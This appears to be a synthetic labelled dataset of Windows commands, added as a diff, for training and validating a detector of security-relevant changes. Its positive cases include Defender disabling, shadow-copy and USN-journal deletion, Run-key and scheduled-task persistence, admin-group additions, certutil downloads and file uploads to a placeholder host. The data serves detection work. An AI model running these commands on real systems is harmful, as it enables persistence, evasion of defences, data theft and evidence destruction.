@@ -1,0 +1,456 @@
+{
+  "version": "aegis-command-refine-v1",
+  "synthetic": true,
+  "source": "Hand-authored fictional examples, no executed commands or real logs",
+  "license": "Project-authored synthetic text; repository license applies if specified",
+  "cases": [
+    {
+      "id": "train-net-accounts-negative-1",
+      "split": "train",
+      "group": "net-accounts",
+      "label": "negative",
+      "command": "net accounts",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-net-accounts-negative-2",
+      "split": "train",
+      "group": "net-accounts",
+      "label": "negative",
+      "command": "net accounts /domain",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-net-accounts-positive-1",
+      "split": "train",
+      "group": "net-accounts",
+      "label": "positive",
+      "command": "net user demo_guest /active:yes",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-net-accounts-positive-2",
+      "split": "train",
+      "group": "net-accounts",
+      "label": "positive",
+      "command": "net localgroup Administrators demo_guest /add",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-registry-run-negative-1",
+      "split": "train",
+      "group": "registry-run",
+      "label": "negative",
+      "command": "reg query HKCU\\Software\\DemoApp",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-registry-run-negative-2",
+      "split": "train",
+      "group": "registry-run",
+      "label": "negative",
+      "command": "reg query HKLM\\Software\\DemoApp /v Version",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-registry-run-positive-1",
+      "split": "train",
+      "group": "registry-run",
+      "label": "positive",
+      "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Demo /d C:\\Synthetic\\agent.exe /f",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-registry-run-positive-2",
+      "split": "train",
+      "group": "registry-run",
+      "label": "positive",
+      "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v Demo /d C:\\Synthetic\\agent.exe /f",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-scheduled-task-negative-1",
+      "split": "train",
+      "group": "scheduled-task",
+      "label": "negative",
+      "command": "schtasks /query /tn DemoReport",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-scheduled-task-negative-2",
+      "split": "train",
+      "group": "scheduled-task",
+      "label": "negative",
+      "command": "schtasks /query /tn DemoCleanup",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-scheduled-task-positive-1",
+      "split": "train",
+      "group": "scheduled-task",
+      "label": "positive",
+      "command": "schtasks /create /tn DemoRun /tr C:\\Synthetic\\agent.exe /sc onlogon /f",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-scheduled-task-positive-2",
+      "split": "train",
+      "group": "scheduled-task",
+      "label": "positive",
+      "command": "schtasks /create /tn DemoBoot /tr C:\\Synthetic\\agent.exe /sc onstart /f",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-service-control-negative-1",
+      "split": "train",
+      "group": "service-control",
+      "label": "negative",
+      "command": "sc.exe query DemoMonitor",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-service-control-negative-2",
+      "split": "train",
+      "group": "service-control",
+      "label": "negative",
+      "command": "sc.exe qc DemoMonitor",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-service-control-positive-1",
+      "split": "train",
+      "group": "service-control",
+      "label": "positive",
+      "command": "sc.exe stop DemoMonitor",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-service-control-positive-2",
+      "split": "train",
+      "group": "service-control",
+      "label": "positive",
+      "command": "sc.exe delete DemoMonitor",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-disk-copy-negative-1",
+      "split": "train",
+      "group": "disk-copy",
+      "label": "negative",
+      "command": "robocopy C:\\Synthetic\\Docs D:\\Synthetic\\Backup /L",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-disk-copy-negative-2",
+      "split": "train",
+      "group": "disk-copy",
+      "label": "negative",
+      "command": "robocopy C:\\Synthetic\\Notes D:\\Synthetic\\Backup /L",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-disk-copy-positive-1",
+      "split": "train",
+      "group": "disk-copy",
+      "label": "positive",
+      "command": "robocopy C:\\Synthetic\\Empty D:\\Synthetic\\Reports /MIR",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-disk-copy-positive-2",
+      "split": "train",
+      "group": "disk-copy",
+      "label": "positive",
+      "command": "robocopy C:\\Synthetic\\Empty D:\\Synthetic\\Archive /MIR",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-wmic-discovery-negative-1",
+      "split": "train",
+      "group": "wmic-discovery",
+      "label": "negative",
+      "command": "wmic os get caption",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-wmic-discovery-negative-2",
+      "split": "train",
+      "group": "wmic-discovery",
+      "label": "negative",
+      "command": "wmic cpu get name",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-wmic-discovery-positive-1",
+      "split": "train",
+      "group": "wmic-discovery",
+      "label": "positive",
+      "command": "wmic process call create C:\\Synthetic\\agent.exe",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-wmic-discovery-positive-2",
+      "split": "train",
+      "group": "wmic-discovery",
+      "label": "positive",
+      "command": "wmic shadowcopy delete",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-certutil-use-negative-1",
+      "split": "train",
+      "group": "certutil-use",
+      "label": "negative",
+      "command": "certutil -hashfile C:\\Synthetic\\guide.pdf SHA256",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-certutil-use-negative-2",
+      "split": "train",
+      "group": "certutil-use",
+      "label": "negative",
+      "command": "certutil -verify C:\\Synthetic\\certificate.cer",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-certutil-use-positive-1",
+      "split": "train",
+      "group": "certutil-use",
+      "label": "positive",
+      "command": "certutil -urlcache -split -f https://example.invalid/agent.bin C:\\Synthetic\\agent.bin",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-certutil-use-positive-2",
+      "split": "train",
+      "group": "certutil-use",
+      "label": "positive",
+      "command": "certutil -urlcache -f https://example.invalid/tool.dat C:\\Synthetic\\tool.dat",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-powershell-policy-negative-1",
+      "split": "train",
+      "group": "powershell-policy",
+      "label": "negative",
+      "command": "powershell.exe -NoProfile -Command Get-Date",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-powershell-policy-negative-2",
+      "split": "train",
+      "group": "powershell-policy",
+      "label": "negative",
+      "command": "powershell.exe -NoProfile -Command Get-Location",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-powershell-policy-positive-1",
+      "split": "train",
+      "group": "powershell-policy",
+      "label": "positive",
+      "command": "powershell.exe -NoProfile -Command Set-MpPreference -DisableRealtimeMonitoring $true",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-powershell-policy-positive-2",
+      "split": "train",
+      "group": "powershell-policy",
+      "label": "positive",
+      "command": "powershell.exe -NoProfile -Command Stop-Service DemoMonitor -Force",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-permission-change-negative-1",
+      "split": "train",
+      "group": "permission-change",
+      "label": "negative",
+      "command": "icacls C:\\Synthetic\\Reports",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-permission-change-negative-2",
+      "split": "train",
+      "group": "permission-change",
+      "label": "negative",
+      "command": "icacls C:\\Synthetic\\Archive",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "train-permission-change-positive-1",
+      "split": "train",
+      "group": "permission-change",
+      "label": "positive",
+      "command": "icacls C:\\Synthetic\\Reports /reset /T",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-permission-change-positive-2",
+      "split": "train",
+      "group": "permission-change",
+      "label": "positive",
+      "command": "icacls C:\\Synthetic\\Archive /reset /T",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "validation-windows-feature-negative-1",
+      "split": "validation",
+      "group": "windows-feature",
+      "label": "negative",
+      "command": "dism /online /Get-Features",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "validation-windows-feature-negative-2",
+      "split": "validation",
+      "group": "windows-feature",
+      "label": "negative",
+      "command": "dism /online /Get-FeatureInfo /FeatureName:DemoFeature",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "validation-windows-feature-positive-1",
+      "split": "validation",
+      "group": "windows-feature",
+      "label": "positive",
+      "command": "dism /online /Disable-Feature /FeatureName:DemoSecurity",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "validation-windows-feature-positive-2",
+      "split": "validation",
+      "group": "windows-feature",
+      "label": "positive",
+      "command": "dism /online /Disable-Feature /FeatureName:DemoMonitor",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "validation-registry-service-negative-1",
+      "split": "validation",
+      "group": "registry-service",
+      "label": "negative",
+      "command": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\DemoMonitor",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "validation-registry-service-negative-2",
+      "split": "validation",
+      "group": "registry-service",
+      "label": "negative",
+      "command": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\DemoAudit",
+      "reason": "Read-only fictional management operation"
+    },
+    {
+      "id": "validation-registry-service-positive-1",
+      "split": "validation",
+      "group": "registry-service",
+      "label": "positive",
+      "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\DemoMonitor /v Start /t REG_DWORD /d 4 /f",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "validation-registry-service-positive-2",
+      "split": "validation",
+      "group": "registry-service",
+      "label": "positive",
+      "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\DemoAudit /v Start /t REG_DWORD /d 4 /f",
+      "reason": "Fictional security-relevant change or transfer requiring review; intent and execution unproven"
+    },
+    {
+      "id": "train-approved-download-negative-1",
+      "split": "train",
+      "group": "approved-download",
+      "label": "negative",
+      "command": "powershell.exe -Command Invoke-RestMethod -Uri https://example.invalid/manual -OutFile C:\\Synthetic\\manual.pdf",
+      "reason": "Fictional scenario label; authorization, content and execution outcome are not available from command text"
+    },
+    {
+      "id": "train-approved-download-negative-2",
+      "split": "train",
+      "group": "approved-download",
+      "label": "negative",
+      "command": "powershell.exe -Command Invoke-RestMethod -Uri https://example.invalid/notes -OutFile C:\\Synthetic\\notes.pdf",
+      "reason": "Fictional scenario label; authorization, content and execution outcome are not available from command text"
+    },
+    {
+      "id": "train-approved-download-positive-1",
+      "split": "train",
+      "group": "approved-download",
+      "label": "positive",
+      "command": "powershell.exe -Command Invoke-RestMethod -Method Post -Uri https://example.invalid/upload -InFile C:\\Synthetic\\records.zip",
+      "reason": "Fictional scenario label; authorization, content and execution outcome are not available from command text"
+    },
+    {
+      "id": "train-approved-download-positive-2",
+      "split": "train",
+      "group": "approved-download",
+      "label": "positive",
+      "command": "powershell.exe -Command Invoke-RestMethod -Method Post -Uri https://example.invalid/upload -InFile C:\\Synthetic\\reports.zip",
+      "reason": "Fictional scenario label; authorization, content and execution outcome are not available from command text"
+    },
+    {
+      "id": "validation-journal-config-negative-1",
+      "split": "validation",
+      "group": "journal-config",
+      "label": "negative",
+      "command": "fsutil usn queryjournal C:",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "validation-journal-config-negative-2",
+      "split": "validation",
+      "group": "journal-config",
+      "label": "negative",
+      "command": "fsutil usn queryjournal D:",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "validation-journal-config-positive-1",
+      "split": "validation",
+      "group": "journal-config",
+      "label": "positive",
+      "command": "fsutil usn deletejournal /D C:",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "validation-journal-config-positive-2",
+      "split": "validation",
+      "group": "journal-config",
+      "label": "positive",
+      "command": "fsutil usn deletejournal /D D:",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "validation-ownership-change-negative-1",
+      "split": "validation",
+      "group": "ownership-change",
+      "label": "negative",
+      "command": "takeown /?",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "validation-ownership-change-negative-2",
+      "split": "validation",
+      "group": "ownership-change",
+      "label": "negative",
+      "command": "takeown /? /A",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "validation-ownership-change-positive-1",
+      "split": "validation",
+      "group": "ownership-change",
+      "label": "positive",
+      "command": "takeown /F C:\\Synthetic\\Audit /R /D Y",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    },
+    {
+      "id": "validation-ownership-change-positive-2",
+      "split": "validation",
+      "group": "ownership-change",
+      "label": "positive",
+      "command": "takeown /F C:\\Synthetic\\Records /R /D Y",
+      "reason": "Synthetic management or security-relevant operation; intent and execution are not established"
+    }
+  ]
+}
